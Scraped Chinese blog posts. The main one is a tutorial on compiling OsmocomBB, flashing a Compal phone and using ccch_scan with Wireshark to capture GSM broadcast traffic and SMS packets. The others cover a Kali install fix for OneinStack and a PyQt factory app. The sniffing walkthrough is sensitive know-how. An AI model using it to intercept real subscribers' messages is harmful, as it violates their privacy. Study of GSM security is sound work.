<pre class=""brush:bash;"">sudo apt-get install build-essential libtool libtalloc-dev shtool autoconf automake git-core pkg-config make gcc</pre>
接下来还必须安装一些库
<pre class=""brush:bash;"">sudo apt-get install libpcsclite-dev</pre>
下面就可以把代码同步下来了（<span style=""color:#E53333;"">注意：这里如果没有梯子的话速度非常慢，有时候直接无法连接，请自行准备梯子</span>）
<pre class=""brush:bash;"">git clone git://git.osmocom.org/libosmocore.git</pre>
同步代码之后就可以编译了
<pre class=""brush:bash;"">cd libosmocore/
autoreconf -i
./configure
make
sudo make install
sudo ldconfig -i
cd ..</pre>
<p>
	编译安装完libosmocore就可以继续编译osmocombb了，首先同步最新代码（<span style=""color:#E53333;"">注意：请自备梯子</span>）
</p>
<pre class=""brush:bash;"">git clone git://git.osmocom.org/osmocom-bb.git
cd osmocom-bb
git pull --rebase</pre>
代码拉取回来之后执行编译
<pre class=""brush:bash;"">cd src
make</pre>
如果一切顺利的话osmocombb就编译好了，接下来就是测试部分了
<h3>
	[3]、运行测试
</h3>
<p>
	插上USB数据线执行下面命令查看USB设备是否存在
</p>
<pre class=""brush:bash;"">$ lsusb
Bus 002 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hub
Bus 001 Device 003: ID 046a:0011 Cherry GmbH G83 (RS 6000) Keyboard
Bus 001 Device 002: ID 09da:c10a A4Tech Co., Ltd. 
Bus 001 Device 008: ID 10c4:ea60 Cygnal Integrated Products, Inc. CP210x UART Bridge / myAVR mySmartUSB light
Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub
</pre>
博主这里使用的USB转TTL模块是CP2102，然后执行下面的命令连接手机
<pre class=""brush:bash;"">cd host/osmocon/
sudo ./osmocon -p /dev/ttyUSB0 -m c123xor ../../target/firmware/board/compal_e88/layer1.compalram.bin</pre>
然后轻触手机的开机键，屏幕上会显示刷入固件的一些信息
<pre class=""brush:bash;"">got 2 bytes from modem, data looks like: 04 81  ..
got 5 bytes from modem, data looks like: 1b f6 02 00 41  ....A
got 1 bytes from modem, data looks like: 01  .
got 1 bytes from modem, data looks like: 40  @
Received PROMPT1 from phone, responding with CMD
read_file(../../target/firmware/board/compal_e88/layer1.compalram.bin): file_size=58484, hdr_len=4, dnload_len=58491
got 1 bytes from modem, data looks like: 1b  .
got 1 bytes from modem, data looks like: f6  .
got 1 bytes from modem, data looks like: 02  .
got 1 bytes from modem, data looks like: 00  .
got 1 bytes from modem, data looks like: 41  A
got 1 bytes from modem, data looks like: 02  .
got 1 bytes from modem, data looks like: 43  C
Received PROMPT2 from phone, starting download
handle_write(): 4096 bytes (4096/58491)
handle_write(): 4096 bytes (8192/58491)
handle_write(): 4096 bytes (12288/58491)
handle_write(): 4096 bytes (16384/58491)
handle_write(): 4096 bytes (20480/58491)
handle_write(): 4096 bytes (24576/58491)
handle_write(): 4096 bytes (28672/58491)
handle_write(): 4096 bytes (32768/58491)
handle_write(): 4096 bytes (36864/58491)
handle_write(): 4096 bytes (40960/58491)
handle_write(): 4096 bytes (45056/58491)
handle_write(): 4096 bytes (49152/58491)
handle_write(): 4096 bytes (53248/58491)
handle_write(): 4096 bytes (57344/58491)
handle_write(): 1147 bytes (58491/58491)
handle_write(): finished
got 1 bytes from modem, data looks like: 1b  .
got 1 bytes from modem, data looks like: f6  .
got 1 bytes from modem, data looks like: 02  .
got 1 bytes from modem, data looks like: 00  .
got 1 bytes from modem, data looks like: 41  A
got 1 bytes from modem, data looks like: 03  .
got 1 bytes from modem, data looks like: 42  B
Received DOWNLOAD ACK from phone, your code is running now!
battery_compal_e88_init: starting up


OsmocomBB Layer 1 (revision osmocon_v0.0.0-1845-g363d4d2)
======================================================================
Device ID code: 0xb4fb
Device Version code: 0x0000
ARM ID code: 0xfff3
cDSP ID code: 0x0128
Die ID code: cdc1111fdb00d7f0
======================================================================
REG_DPLL=0x2413
CNTL_ARM_CLK=0xf0a1
CNTL_CLK=0xff91
CNTL_RST=0xfff3
CNTL_ARM_DIV=0xfff9
======================================================================
Power up simcard:


THIS FIRMWARE WAS COMPILED WITHOUT TX SUPPORT!!!
Assert DSP into Reset
Releasing DSP from Reset
Setting some dsp_api.ndb values
Setting API NDB parameters
DSP Download Status: 0x0001
DSP API Version: 0x0000 0x0000
Finishing download phase
DSP Download Status: 0x0002
DSP API Version: 0x3606 0x0000
LOST 13!</pre>
至此固件刷入成功，接着测试ARFCN频点扫描，新开一个终端窗口，执行如下命令（<span style=""color:#E53333;"">注意：之前那个刷入固件的窗口全程不能关闭，否则手机和电脑的连接就断开了</span>），切换到 armtoolchain/osmocom-bb/src/host/layer23/src/misc/ 目录执行如下命令
<pre class=""brush:bash;"">sudo ./cell_log -O</pre>
会看到屏幕回显信息
<pre class=""brush:bash;"">Copyright (C) 2010 Andreas Eversberg

License GPLv2+: GNU GPL version 2 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

./cell_log: invalid option -- 'O'
Failed to connect to '/tmp/osmocom_sap'
Failed during sap_open(), no SIM reader
&lt;000e&gt; cell_log.c:804 Scanner initialized
Mobile initialized, please start phone now!
&lt;000e&gt; cell_log.c:368 Measure from 0 to 124
&lt;000e&gt; cell_log.c:368 Measure from 512 to 885
&lt;000e&gt; cell_log.c:368 Measure from 955 to 1023
&lt;000e&gt; cell_log.c:359 Measurement done
&lt;000e&gt; cell_log.c:341 Sync ARFCN 2 (rxlev -53, 567 syncs left)
&lt;000e&gt; cell_log.c:191 Cell: ARFCN=2 MCC=460 MNC=00 (China, China Mobile)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 854 (rxlev -65, 566 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 3 (rxlev -66, 565 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 110 (rxlev -66, 564 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 1 (rxlev -69, 563 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 28 (rxlev -69, 562 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 48 (rxlev -71, 561 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 802 (rxlev -72, 560 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 801 (rxlev -73, 559 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 808 (rxlev -73, 558 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 814 (rxlev -73, 557 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 827 (rxlev -73, 556 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 795 (rxlev -74, 555 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 797 (rxlev -74, 554 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 800 (rxlev -74, 553 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 804 (rxlev -74, 552 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 805 (rxlev -74, 551 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 807 (rxlev -74, 550 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 810 (rxlev -74, 549 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 811 (rxlev -74, 548 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 813 (rxlev -74, 547 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 815 (rxlev -74, 546 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 817 (rxlev -74, 545 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 818 (rxlev -74, 544 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 828 (rxlev -74, 543 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 830 (rxlev -74, 542 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 840 (rxlev -74, 541 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 791 (rxlev -75, 540 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 794 (rxlev -75, 539 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 798 (rxlev -75, 538 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 816 (rxlev -75, 537 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 820 (rxlev -75, 536 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 821 (rxlev -75, 535 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 823 (rxlev -75, 534 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 824 (rxlev -75, 533 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 826 (rxlev -75, 532 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 834 (rxlev -75, 531 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 836 (rxlev -75, 530 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 837 (rxlev -75, 529 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 839 (rxlev -75, 528 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 843 (rxlev -75, 527 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 58 (rxlev -76, 526 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 74 (rxlev -76, 525 syncs left)
&lt;000e&gt; cell_log.c:191 Cell: ARFCN=74 MCC=460 MNC=00 (China, China Mobile)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 792 (rxlev -76, 524 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 799 (rxlev -76, 523 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 803 (rxlev -76, 522 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 812 (rxlev -76, 521 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 825 (rxlev -76, 520 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 829 (rxlev -76, 519 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 831 (rxlev -76, 518 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 833 (rxlev -76, 517 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 841 (rxlev -76, 516 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 70 (rxlev -77, 515 syncs left)
&lt;000e&gt; cell_log.c:191 Cell: ARFCN=70 MCC=460 MNC=00 (China, China Mobile)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 76 (rxlev -77, 514 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 793 (rxlev -77, 513 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 806 (rxlev -77, 512 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 819 (rxlev -77, 511 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 832 (rxlev -77, 510 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 838 (rxlev -77, 509 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 842 (rxlev -77, 508 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 844 (rxlev -77, 507 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 846 (rxlev -77, 506 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 847 (rxlev -77, 505 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 850 (rxlev -77, 504 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 852 (rxlev -77, 503 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 853 (rxlev -77, 502 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 856 (rxlev -77, 501 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 5 (rxlev -78, 500 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 822 (rxlev -78, 499 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 849 (rxlev -78, 498 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 855 (rxlev -78, 497 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 857 (rxlev -78, 496 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 19 (rxlev -79, 495 syncs left)
&lt;000e&gt; cell_log.c:191 Cell: ARFCN=19 MCC=460 MNC=00 (China, China Mobile)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 20 (rxlev -79, 494 syncs left)
&lt;000e&gt; cell_log.c:341 Sync ARFCN 73 (rxlev -79, 493 syncs left)</pre>
博主这里是使用的主分支的代码，其他分支对于扫描和嗅探部分有不同的处理方式，需要的朋友可以参考官方文档切换到其他分支测试，我这里选择一个ARFCN为2的频点进行嗅探。
<p>
	CTRL+C结束掉ARFCN（注意：有的分支不需要手动结束，扫描完成之后会自动结束），直接如下命令进行嗅探测试
</p>
<pre class=""brush:bash;"">sudo ./ccch_scan -i 127.0.0.1 -a 2</pre>
会看到如下回显
<pre class=""brush:bash;"">Copyright (C) 2010 Harald Welte &lt;laforge@gnumonks.org&gt;
Contributions by Holger Hans Peter Freyther

License GPLv2+: GNU GPL version 2 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Failed to connect to '/tmp/osmocom_sap'
Failed during sap_open(), no SIM reader
&lt;0001&gt; app_ccch_scan.c:415 PCH pdisc != RR
&lt;0001&gt; app_ccch_scan.c:438 unknown PCH/AGCH type 0x2b
&lt;0001&gt; app_ccch_scan.c:352 Paging1: Normal paging chan tch/h to TMSI M(0x5d5c3920) 
&lt;0001&gt; app_ccch_scan.c:355 Paging2: Normal paging chan any to TMSI M(0x3f48a7ed) 
&lt;0001&gt; app_ccch_scan.c:378 Paging3: Normal paging chan n/a  to tmsi M(3601270982) 
&lt;0001&gt; app_ccch_scan.c:312 Paging1: Normal paging chan sdch to tmsi M(2084053213) 
&lt;0001&gt; app_ccch_scan.c:415 PCH pdisc != RR
&lt;0001&gt; app_ccch_scan.c:438 unknown PCH/AGCH type 0x2b
&lt;0001&gt; app_ccch_scan.c:415 PCH pdisc != RR
&lt;0001&gt; app_ccch_scan.c:438 unknown PCH/AGCH type 0x2b
&lt;0001&gt; app_ccch_scan.c:312 Paging1: Normal paging chan any to tmsi M(3516964967) 
&lt;0001&gt; app_ccch_scan.c:75 SI1 received.
&lt;0001&gt; app_ccch_scan.c:415 PCH pdisc != RR
&lt;0001&gt; app_ccch_scan.c:438 unknown PCH/AGCH type 0x2b
&lt;0001&gt; app_ccch_scan.c:415 PCH pdisc != RR
&lt;0001&gt; app_ccch_scan.c:438 unknown PCH/AGCH type 0x2b
&lt;0001&gt; app_ccch_scan.c:312 Paging1: Normal paging chan any to tmsi M(3936876559) 
&lt;0001&gt; app_ccch_scan.c:312 Paging1: Normal paging chan tch/h to tmsi M(1647379545) 
&lt;0001&gt; app_ccch_scan.c:415 PCH pdisc != RR
&lt;0001&gt; app_ccch_scan.c:438 unknown PCH/AGCH type 0x2b
</pre>
不要关闭这个窗口，使用管理员权限打开wireshark软件，如果没有这个软件请自行安装，使用如下命令打开
<pre class=""brush:bash;"">sudo wireshark</pre>
你会看到一个报错信息
<pre class=""brush:bash;"">Lua: Error during loading:
 [string ""/usr/share/wireshark/init.lua""]:44: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.</pre>
不要惊慌，点击OK按钮即可，然后双击 Loopback:lo接口进行流量解析，如下图所示<div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=560"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201710/143a231aa8fc33b5ec3afd310c01b8da.png"" alt=""2017-10-24 13-57-26屏幕截图.png - 大小: 80.14 KB - 尺寸: 752 x 576 - 点击打开新窗口浏览全图"" width=""752"" height=""576""></a></div>接着你会看到刷刷刷很多信息都是解析的GSMTAP数据包，这里我们需要对数据类型进行过滤，在上面的输入框中输入gsm_sms进行过滤。
<p>
	</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=561"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201710/91730bd2287c42944832a00103d17b6a.png"" alt=""2017-10-24 13-58-16屏幕截图.png - 大小: 248 KB - 尺寸: 940 x 853 - 点击打开新窗口浏览全图"" width=""900"" height=""817""></a></div>

<p>
	剩下的就是等待短信的到来
</p>
<h2>
	后记
</h2>
<p>
	文中只是很简单的描述了osmocombb的常规编译测试流程，还有很多细节需要朋友们自己去探索，比如其他分支的切换，sms数据包内容的解读，遇到编译报错怎么解决，刷入固件失败等等，这些问题都是很经常遇到的，希望大家在玩的时候慢慢折腾。
</p>
<p>
	这里博主需要说明一下，osmocombb项目并不一定非得在kali linux下面才能跑，其他的Linux发行版本依然跑的很顺，比如博主用的Linux Mint就一次性编译通过，没有出任何问题，希望大家不要被误导。
</p>
<h2>
	致谢
</h2>
<p>
	https://osmocom.org/projects/baseband/wiki/GnuArmToolchain
</p>
<p>
	https://osmocom.org/projects/baseband/wiki/Software_Getting_Started
</p>
<p>
	https://osmocom.org/projects/libosmocore/wiki/Libosmocore
</p><div class=""useWarning"" style=""background-color: #f0f0f0"">
本文链接：https://www.92ez.com/?action=show&amp;id=23458 <br>
                        <b>!!! 转载请先联系non3gov@gmail.com授权并在显著位置注明作者和原文链接 !!! <a href=""https://www.92ez.com/black.html"" target=""_blank"" style=""color: #000;text-decoration: underline;background: none"">小黑屋</a> </b><br>
提示：技术文章有一定的时效性，请先确认是否适用你当前的系统环境。
</div>

<style type=""text/css"">
.useWarning a{color:#fff;background-color:#ea6f5a;border-radius:3px;padding:5px 10px;text-decoration: none;}
.tuijian{margin-top:10px;}
.tuijian a{display:block;}
.tuijian img{padding:0;margin:0;}
.tuijian a img{display:block;width:100%;}
.donateme{font-size: 14px;display:none;}
.donateme a{color: green;font-weight: bold;}
.useWarning{padding: 5px 10px;border: #c00 1px dashed;margin: 10px 0 0;color: #c00;}
</style>
</div>","KBdancer, 发表于 2017-10-24, 11:17 AM. 
发表在：
								
 ,经验分享,
",Ubuntu 编译 OsmocomBB 环境 [更新2017-10-24]
"<div class=""post-body"">
<h2>
	前言
</h2>
<p>
	OneinStack 是一款非常棒的一键部署web服务的集成包，之前博主一直使用一键lnmp包进行快速配置环境，与OneinStack不同的是，一键lnmp使用php-fpm来处理php请求，而OneinStack则是把php请求转发给httpd处理，当然OneinStack可以直接部署nginx + httpd + 
php + tomcat + ftp + mysql 
等等很实用的软件，两款集成包的相同点是都支持主流的Linux操作系统，绝大部分的VPS服务器都能顺利跑起来，但是比较遗憾的是lnmp和OneinStack似乎都不能直接安装到Kali
 Linux系统上，虽然他们都支持Debian系列的Linux的发行版，而kali 
linux本身就是基于Debian，观察脚本里面的命令后发现其实只需要稍微做一下修改就可以顺利安装了。
</p>
<h2>
	解决
</h2>
<p>
	博主在尝试安装OneinStack的时候遇到如图所示的问题</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=558"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201710/54db1f6e354e3af72effbfc29595b132.png"" alt=""2017-10-23 15-18-12屏幕截图.png - 大小: 29.2 KB - 尺寸: 626 x 135 - 点击打开新窗口浏览全图"" width=""626"" height=""135""></a></div>脚本提示不支持当前系统类型，使用vim打开install.sh脚本观察，发现如下一段代码

<pre class=""brush:bash;"">. ./include/check_os.sh</pre>
<p>
	判断系统类型的脚本是check_os.sh，于是打开这个脚本，找到下面这段
</p>
<pre class=""brush:bash;""># kali rolling
elif [ -n ""$(grep 'Kali GNU/Linux Rolling' /etc/issue)"" -o ""$(lsb_release -is 2&gt;/dev/null)"" == ""Kali"" ]; then
  OS=Debian</pre>
乍一看这句应该是支持    Kali才对啊，怎么会不支持呢，看下Kali下面是输出了啥，执行命令
<pre class=""brush:bash;"">root@kali:~# cat /etc/issue
Kali GNU/Linux Rolling \n \l
root@kali:~# lsb_release 
No LSB modules are available.</pre>
<p>
	发现这样输出对于上面那个判断语句来说应该是成立的才对，但是依然无效，于是观察到上面关于Debian的判断
</p>
<pre class=""brush:bash;"">elif [ -n ""$(grep 'bian' /etc/issue)"" -o ""$(lsb_release -is 2&gt;/dev/null)"" == ""Debian"" ]; then
  OS=Debian</pre>
<p>
	对这个判断进行修改，将bian修改为Kali，之后运行install.sh发现能够正常通过，修改后的语句为
</p>
<pre class=""brush:bash;"">elif [ -n ""$(grep 'Kali' /etc/issue)"" -o ""$(lsb_release -is 2&gt;/dev/null)"" == ""Debian"" ]; then
  OS=Debian</pre><div class=""useWarning"" style=""background-color: #f0f0f0"">
本文链接：https://www.92ez.com/?action=show&amp;id=23457 <br>
                        <b>!!! 转载请先联系non3gov@gmail.com授权并在显著位置注明作者和原文链接 !!! <a href=""https://www.92ez.com/black.html"" target=""_blank"" style=""color: #000;text-decoration: underline;background: none"">小黑屋</a> </b><br>
提示：技术文章有一定的时效性，请先确认是否适用你当前的系统环境。
</div>

<style type=""text/css"">
.useWarning a{color:#fff;background-color:#ea6f5a;border-radius:3px;padding:5px 10px;text-decoration: none;}
.tuijian{margin-top:10px;}
.tuijian a{display:block;}
.tuijian img{padding:0;margin:0;}
.tuijian a img{display:block;width:100%;}
.donateme{font-size: 14px;display:none;}
.donateme a{color: green;font-weight: bold;}
.useWarning{padding: 5px 10px;border: #c00 1px dashed;margin: 10px 0 0;color: #c00;}
</style>
</div>","KBdancer, 发表于 2017-10-23, 3:45 PM. 
发表在：
								
 ,经验分享,
",Kali Linux 安装 OneinStack
"<div class=""post-body"">
<h2>
	前言
</h2>
<p>
	首先说明一下，这个项目并不是一个比较正式的项目，只是博主在业余时间接下来的一个私活，项目虽然是个坑，但是依然让我学习到了Python的很多知识，钱没有赚到，知识学到也算是一种进步吧。
</p>
<p>
	这篇文章就来说说这个项目我是如何从入手到放弃的，顺便聊聊给传统工厂车间做软件的体验，这酸爽....只有亲身体验才知道啊。
</p>
<h2>
	背景
</h2>
<p>
	关于这个项目的前期需求分析阶段就不多说了，总的功能概括一下就是软件控制传送带运行与停止，控制扫码枪扫码，软件记录扫描结果与预设值进行比对，然后做对应的报警处理。
</p>
<p>
	拿到需求之后准备进入开发阶段，博主首选的开发语言是WPF，但是博主之前并没有WPF的开发经验，放弃。然后考虑的是java，博主用java写过界面，那个痛苦的过程就不说了，画界面岂是一般人能干的事儿？再说java天生就不适合做这种桌面客户端，放弃java。接着想到了易语言，毕竟博主7年前还用易语言写过外挂，但是现在让博主用易语言开发个桌面客户端，似乎有点太不正规了，总觉得怪怪的，放弃易语言。然后想到了微软的老牌编程语言VB，开发起来简单，但是博主并没有写过VB的软件，so...放弃。怎么办？好焦虑啊！！想来想去忽然想到，Python不也可以写界面？正好博主还是比较擅长写Python的，只是对于Python的GUI编程并没有经验，想想应该不会太难（事实证明博主太天真），就决定使用Python开发这个桌面程序，而且还可以跨平台使用。
</p>
<h2>
	开发
</h2>
<p>
	Python的GUI方案比较多，博主就选择了<a href=""https://www.92ez.com/?action=article&amp;tag=pyqt"" onclick=""javascript:tagshow('pyqt');return false;"">pyqt</a>，Qt作为一款非常火爆的GUI编程方案，在C++上用的多，后来被移植到Python，想必也会跟C++下面使用一样方便吧。博主经过短暂的学习就准备开工了，甲方问我多少时间能够开发完，我给时间为2周交付测试版本，报价为5000块，想到既然是帮同学开发，价格随意就好，为了保险起见我提出了先付定金签合同，然后再开发，然而Z的领导说先让我出测试版，想想既然项目不大也就算了，先开发就先开发吧。
</p>
<p>
	其实2周时间对我来说绝对是足够的，开发这样一个软件无非就是串口通信，数据库的读写，excel的解析，导入导出等等这些功能，博主之前写Arduino的时候对串口通信也有比较深入的学习，所以写起来难度并不是很大。这里给出我写的测试版本界面（运行在Linux系统下面）</p><div class=""attach""><a href=""https://www.92ez.com/attachment.php?id=557"" target=""_blank""><img src=""https://www.92ez.com/attachments/date_201710/8ffac220611dccce8dfd0a2ea8dae638.png"" alt=""2017-10-18 14-31-50屏幕截图.png - 大小: 109.13 KB - 尺寸: 1191 x 721 - 点击打开新窗口浏览全图"" width=""900"" height=""545""></a></div>

<p>
	这里对使用的一些模块以及实现的方法做个简单的介绍，还有一些坑的解决方法。
</p>
<p>
	首先，需要构建窗体，实际上构建窗体是非常简单的，我这里需要构建两个窗体，一个主窗体，一个是点击设置按钮的时候弹出来的一个模态框，当然模态框也是一个窗体，将其模式设置为模态就可以了，使用
</p>
<pre class=""brush:py;"">setModal(True)</pre>
如果你想设置一个半透明的窗体也是非常的简单，使用下面这个方法
<pre class=""brush:py;"">setWindowOpacity(0.5)</pre>
需要注意的是PyQt里面如果想要窗体启动的时候正好位于屏幕正中央，没有什么好方法，就是要自己计算宽高偏移坐标。
<p>
	在PyQt里面布局并不是很难，有个很好用的组件叫做弹簧组件，这个组件可以帮助你实现居左居右的布局，非常好用，具体实现方法可以搜索PyQt的 addStretch() 方法。
</p>
<p>
	通用的一些样式设置都对应到不同的组件，我之前有文章做了记录，这里贴出来我自己使用的一些组件
</p>
<pre class=""brush:py;"">from PyQt5.QtWidgets import QApplication, QMessageBox, QWidget, QGroupBox, QButtonGroup, QTextBrowser, QHBoxLayout, QComboBox
from PyQt5.QtWidgets import QVBoxLayout, QTableWidget, QDialog, QTableWidgetItem, QAbstractItemView, QHeaderView, QRadioButton, QSpinBox, QFileDialog
from PyQt5.QtWidgets import QDesktopWidget, QLineEdit, QInputDialog, QGridLayout, QLabel, QPushButton, QFrame
from PyQt5.QtGui import QIcon, QCursor, QColor
from PyQt5.QtCore import Qt, QSize, QTimer</pre>
<p>
	串口通信使用的是 serial 模块，这个模块相当的好用，想要获取串口设备的列表要导入 serial.tools.list_ports 这个工具，然后使用下面这段代码获取
</p>
<pre class=""brush:py;"">def get_coms():
    port_list = list(serial.tools.list_ports.comports())
    port_name_list = []
    if len(port_list) &lt; 1:
        print(""The Serial port can't find!"")
    else:
        for port in port_list:
            port_name_list.append(list(port)[0])
    return port_name_list</pre>
是不是非常的简单，如果想要向某个串口发送数据怎么办呢，非常简单，首先实例化一个串口对象，然后打开串口，接着把需要发送的字符串转换成字节码，发送出去就好了，代码如下
<pre class=""brush:py;"">try:
    self.ser_scanner = serial.Serial(self.serial_name_scanner, 15200, timeout=0)
    run_bytes = []
    for i in ""56"".split():
            run_bytes.append(binascii.a2b_hex(i))
    ser.writelines(run_bytes)
except Exception as e:
    print(e)
</pre>
记住这里一定要使用Try except 来捕获异常，因为在实际使用中经常会遇到各种神奇的异常操作，比如串口接触不良，外部设备突然被拔出等等情况，如果没有异常捕获程序直接就死了，要么闪退，这是非常不好的体验。
<p>
	PyQt里面设置样式有个神奇的方法，就是写样式可以像写css一样简单，甚至语法都是一样的，如果你使用的Qtcreator，那么ui跟业务逻辑可以完全分开，博主这个项目并没有使用Qtcreator，而是直接使用idea进行开发，所以很多东西都是混合在一起的，小项目可以这么做，大项目还是分开比较好。
</p>
<p>
	使用PyQt创建的项目，UI界面在不同的系统平台上打开显示的效果很有可能不一样，所以，有时候需要根据当前的操作系统类型动态的改变样式，我这里使用的是 platform 模块判断操作系统类型
</p>
<pre class=""brush:py;"">        if platform == ""linux"" or platform == ""linux2"":
            # linux
            self.setGeometry(350, 350, 450, 390)
        elif platform == ""darwin"":
            # OS X
            self.setGeometry(350, 350, 450, 330)
        elif platform == ""win32"":
            # Windows...
            self.setGeometry(350, 350, 450, 330)</pre>
<p>
	Python里面对于excel的导入导出也非常简单，我这里使用的模块是pyexcel_xls，导入对应的方法进行导入导出操作
</p>
<pre class=""brush:py;"">from pyexcel_xls import get_data
from pyexcel_xls import save_data</pre>
我这里贴出导入excel并解析数据然后存储到sqlite的代码，具体含义就不解释了，毕竟需要结合上下文逻辑才能看得懂
<pre class=""brush:py;"">    def excel_import(self):
        importFileName, importFileType = QFileDialog.getOpenFileName(self, 'Openfile', './', 'xls Files (*.xls)')
        if len(importFileName) &lt; 1:
            print('no file found')
        else:
            xls_data = get_data(importFileName)
            xls_list = []
            for sheet_n in xls_data.keys():
                this_xls_item = xls_data[sheet_n]
                if len(this_xls_item) &gt; 0:
                    xls_list.append(this_xls_item)
            if len(xls_list) &lt; 1:
                print('xls is empty')
            else:
                print('xls is usable')
                for item in xls_list:

                    item_id = item[0][0]
                    item_website = item[0][1]
                    item_status = item[0][2]
                    item_createtime = item[0][3]
                    insert_item_sql = """"""INSERT INTO records(`barcode`,`status`,`createtime`) VALUES(?,?,?)""""""
                    try:
                        my_sqlite_db = Database()
                        my_sqlite_db.insert(insert_item_sql, [item_website, item_status, item_createtime])
                        print('save item ok')
                        self.query_data_from_db()
                    except Exception as e:
                        print(e)</pre>
<p>
	<br>
</p>
<p>
	关于程序的一些关键点就写这么多，如果有朋友需要参考完整代码的可以联系我邮箱。
</p>
<h2>
	后续<br>
</h2>
<p>
	程序写的差不多完成的时候拿去工厂进行测试，由于当时带的笔记本是Linux操作系统，现场网络环境非常差，工厂里面可供使用的电脑配置也很一般，我只能在我的笔记本上演示，演示过程比较顺利，而且Linux下面是不需要安装任何设备驱动的，这一点非常好。
</p>
<p>
	本以为演示完之后就可以顺利的签合同进行收尾的开发，图样图森破！！！
</p>
<p>
	Z的领导说软件不止这个工厂使用，总公司那边也需要使用，而且总公司那边的人看不懂中文（PS：这个厂是中日港三方合资总公司在深圳），而且菲律宾那边的工厂也需要用，所以软件需要使用全英文的界面，这就是前面我的截图全是英文的原因...
</p>
<p>
